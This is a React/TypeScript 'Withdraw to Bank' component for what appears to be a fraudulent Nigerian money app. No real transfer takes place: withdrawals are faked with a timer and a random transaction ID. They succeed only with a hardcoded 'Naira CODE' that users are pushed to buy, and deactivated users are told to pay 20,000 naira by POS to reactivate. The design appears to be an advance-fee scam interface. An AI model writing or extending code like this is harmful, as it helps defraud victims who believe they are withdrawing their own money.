
import React, { useState } from 'react';
import { Icons } from './Icons';
import { User } from '../types';

interface SendMoneyProps {
  user: User;
  onTransfer: (amount: number, recipientInfo: string) => void;
  onSubscribeRedirect: () => void;
  onGoHome: () => void;
}

const banks = [
  "OPAY",
  "PALMPAY",
  "KUDA",
  "MONIEPOINT",
  "Access Bank",
  "GTBank",
  "Zenith Bank",
  "UBA",
  "First Bank",
  "Fidelity Bank",
  "Union Bank",
  "FCMB",
  "Sterling Bank"
];

const SendMoney: React.FC<SendMoneyProps> = ({ user, onTransfer, onSubscribeRedirect, onGoHome }) => {
  const [step, setStep] = useState<'form' | 'success' | 'failed'>('form');
  const [bank, setBank] = useState('');
  const [accountNumber, setAccountNumber] = useState('');
  const [accountName, setAccountName] = useState('');
  const [amount, setAmount] = useState('');
  const [nairaCode, setNairaCode] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');

  const VALID_NAIRA_CODE = 'nairaABC';

  // Calculate deactivation state dynamically
  const isDeactivated = user.deactivationDate && Date.now() > user.deactivationDate;

  // Simulate account name lookup (REMOVED as per request)
  const handleAccountNumberBlur = () => {
    // No longer auto-filling name
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setError('');

    if (isDeactivated) {
        setError("Account is deactivated");
        return;
    }

    if (!nairaCode) {
        setError("Please enter your Naira CODE");
        return;
    }

    if (!accountName) {
        setError("Please enter the Account Name");
        return;
    }

    const transferAmount = parseFloat(amount);
    if (isNaN(transferAmount) || transferAmount <= 0) {
        setError("Please enter a valid amount");
        return;
    }

    if (transferAmount > user.balance) {
        setError("Insufficient funds");
        return;
    }

    setIsLoading(true);

    // Simulate API call
    setTimeout(() => {
        if (nairaCode === VALID_NAIRA_CODE) {
            onTransfer(transferAmount, `Withdraw to ${bank} - ${accountName} (Code: ${nairaCode})`);
            setIsLoading(false);
            setStep('success');
        } else {
            setIsLoading(false);
            setStep('failed');
        }
    }, 1500);
  };

  if (isDeactivated) {
    return (
        <div className="px-4 py-10 flex flex-col items-center justify-center text-center space-y-6 animate-in zoom-in duration-300">
           <div className="w-24 h-24 bg-red-900/30 rounded-full flex items-center justify-center mb-4">
              <Icons.Ban size={48} className="text-red-400" />
          </div>
          <div>
              <h2 className="text-2xl font-bold text-white mb-2">Withdrawal Restricted</h2>
              <div className="bg-red-900/20 p-4 rounded-xl border border-red-800">
                 <p className="text-red-300 font-bold text-sm leading-relaxed">
                     User must pay 20,000 naira to activate account, using a POS.
                 </p>
              </div>
          </div>
          <button 
              onClick={onGoHome}
              className="w-full max-w-sm bg-gray-800 text-white font-bold py-3 rounded-full transition-all"
          >
              Back to Dashboard
          </button>
        </div>
    );
  }

  if (step === 'failed') {
    return (
      <div className="px-4 py-8 flex flex-col items-center justify-center text-center space-y-6 animate-in zoom-in duration-300">
         <div className="w-24 h-24 bg-red-900/10 rounded-full flex items-center justify-center mb-4 relative">
            <div className="absolute inset-0 rounded-full border-4 border-red-500 opacity-20 animate-ping"></div>
            <Icons.X size={48} className="text-red-500" />
        </div>
        <div>
            <h2 className="text-2xl font-bold text-white mb-1">Withdrawal Failed!</h2>
            <p className="text-gray-500 text-sm">
                Your withdrawal request of <span className="font-bold text-white">₦{parseFloat(amount).toLocaleString()}</span> was declined.
            </p>
        </div>
        <div className="bg-red-900/20 p-4 rounded-xl w-full max-w-sm border border-red-800">
            <p className="text-red-400 text-xs font-bold uppercase">Reason: Invalid Naira CODE</p>
            <p className="text-gray-500 text-[10px] mt-1">Please ensure you are using the original Naira CODE provided by the management.</p>
        </div>
        <button 
            onClick={() => setStep('form')}
            className="w-full max-w-sm bg-gray-800 text-white font-bold py-3 rounded-full shadow-md transition-all"
        >
            Try Again
        </button>
        <button 
            onClick={onGoHome}
            className="text-gray-500 text-xs hover:text-white transition-colors"
        >
            Back to Dashboard
        </button>
      </div>
    );
  }

  if (step === 'success') {
    return (
      <div className="px-4 py-8 flex flex-col items-center justify-center text-center space-y-6 animate-in zoom-in duration-300">
         <div className="w-24 h-24 bg-green-neon/10 rounded-full flex items-center justify-center mb-4 relative">
            <div className="absolute inset-0 rounded-full border-4 border-green-neon opacity-20 animate-ping"></div>
            <Icons.Check size={48} className="text-green-neon" />
        </div>
        <div>
            <h2 className="text-2xl font-bold text-white mb-1">Withdrawal Successful!</h2>
            <p className="text-gray-500 text-sm">
                You successfully withdrew <span className="font-bold text-white">₦{parseFloat(amount).toLocaleString()}</span> to {accountName}.
            </p>
        </div>
        <div className="bg-gray-900 p-4 rounded-xl w-full max-w-sm border border-gray-800">
            <div className="flex justify-between py-2 border-b border-gray-800">
                <span className="text-xs text-gray-500">Bank</span>
                <span className="text-sm font-bold text-white">{bank}</span>
            </div>
             <div className="flex justify-between py-2 border-b border-gray-800">
                <span className="text-xs text-gray-500">Account</span>
                <span className="text-sm font-bold text-white">{accountNumber}</span>
            </div>
            <div className="flex justify-between py-2">
                <span className="text-xs text-gray-500">Transaction ID</span>
                <span className="text-xs font-mono text-white">TRX-{Math.floor(Math.random() * 100000000)}</span>
            </div>
        </div>
        <button 
            onClick={onGoHome}
            className="w-full max-w-sm bg-green-neon text-black font-bold py-3 rounded-full shadow-md transition-all"
        >
            Done
        </button>
      </div>
    );
  }

  return (
    <div className="px-4 py-6 space-y-6 animate-in fade-in slide-in-from-bottom-4 duration-500">
      <div className="text-center">
         <h2 className="text-xl font-bold text-white">Withdraw to Bank</h2>
      </div>

      <form onSubmit={handleSubmit} className="space-y-4">
        {error && (
             <div className="bg-red-900/20 text-red-400 text-sm p-3 rounded-lg text-center border border-red-800 animate-pulse">
                {error}
              </div>
        )}

        <div>
            <label className="block text-xs font-bold text-gray-500 mb-1 ml-1">Select Bank</label>
            <div className="relative">
                <select
                    value={bank}
                    onChange={(e) => setBank(e.target.value)}
                    required
                    className="w-full p-3 bg-gray-900 border border-gray-800 rounded-xl appearance-none text-white focus:ring-2 focus:ring-green-neon outline-none"
                >
                    <option value="" disabled>Choose a bank</option>
                    {banks.map(b => (
                        <option key={b} value={b}>{b}</option>
                    ))}
                </select>
                <Icons.ChevronRight className="absolute right-3 top-3.5 text-gray-400 rotate-90" size={20} />
            </div>
        </div>

        <div>
            <label className="block text-xs font-bold text-gray-500 mb-1 ml-1">Account Number</label>
            <input
                type="number"
                value={accountNumber}
                onChange={(e) => {
                    if (e.target.value.length <= 10) setAccountNumber(e.target.value);
                }}
                onBlur={handleAccountNumberBlur}
                placeholder="0123456789"
                required
                className="w-full p-3 bg-gray-900 border border-gray-800 rounded-xl text-white placeholder-gray-500 focus:ring-2 focus:ring-green-neon outline-none font-mono text-lg tracking-wider"
            />
        </div>

        <div>
            <label className="block text-xs font-bold text-gray-500 mb-1 ml-1">Account Name</label>
            <input
                type="text"
                value={accountName}
                onChange={(e) => setAccountName(e.target.value)}
                placeholder="Receiver Name"
                required
                className="w-full p-3 bg-gray-900 border border-gray-800 rounded-xl text-white font-bold focus:ring-2 focus:ring-green-neon outline-none"
            />
        </div>

        <div>
            <label className="block text-xs font-bold text-gray-500 mb-1 ml-1">Amount</label>
            <div className="relative">
                <span className="absolute left-3 top-3 text-gray-500 font-bold">₦</span>
                <input
                    type="number"
                    value={amount}
                    onChange={(e) => setAmount(e.target.value)}
                    placeholder="0.00"
                    required
                    className="w-full p-3 pl-8 bg-gray-900 border border-gray-800 rounded-xl text-white font-bold text-lg focus:ring-2 focus:ring-green-neon outline-none"
                />
            </div>
            <p className="text-xs text-gray-500 text-right mt-1">
                Balance: ₦{user.balance.toLocaleString()}
            </p>
        </div>

        <div>
            <label className="block text-xs font-bold text-gray-500 mb-1 ml-1">Naira CODE</label>
            <input
                type="text"
                value={nairaCode}
                onChange={(e) => setNairaCode(e.target.value)}
                placeholder="Enter your Naira CODE"
                required
                className="w-full p-3 bg-gray-900 border border-gray-800 rounded-xl text-white font-bold focus:ring-2 focus:ring-green-neon outline-none"
            />
            <button 
                type="button"
                onClick={onSubscribeRedirect}
                className="text-[10px] text-green-neon font-bold mt-1 ml-1 hover:underline flex items-center"
            >
                (buy code)
            </button>
        </div>

        <button
            type="submit"
            disabled={isLoading || !bank || !accountNumber || !amount || !nairaCode || !accountName}
            className="w-full py-4 bg-green-neon hover:bg-green-dark disabled:bg-gray-800 text-black font-bold rounded-full shadow-lg transition-all mt-4 flex items-center justify-center space-x-2 animate-green-glow-button"
        >
            {isLoading ? (
                <span>Processing...</span>
            ) : (
                <>
                    <span>Withdraw Money</span>
                    <Icons.ArrowUpRight size={20} />
                </>
            )}
        </button>
      </form>
      <style>{`
        @keyframes green-glow-button {
          0% { box-shadow: 0 0 5px rgba(57, 255, 20, 0.4); }
          50% { box-shadow: 0 0 15px rgba(57, 255, 20, 0.8); }
          100% { box-shadow: 0 0 5px rgba(57, 255, 20, 0.4); }
        }
        .animate-green-glow-button {
          animation: green-glow-button 2s infinite ease-in-out;
        }
      `}</style>
    </div>
  );
};

export default SendMoney;
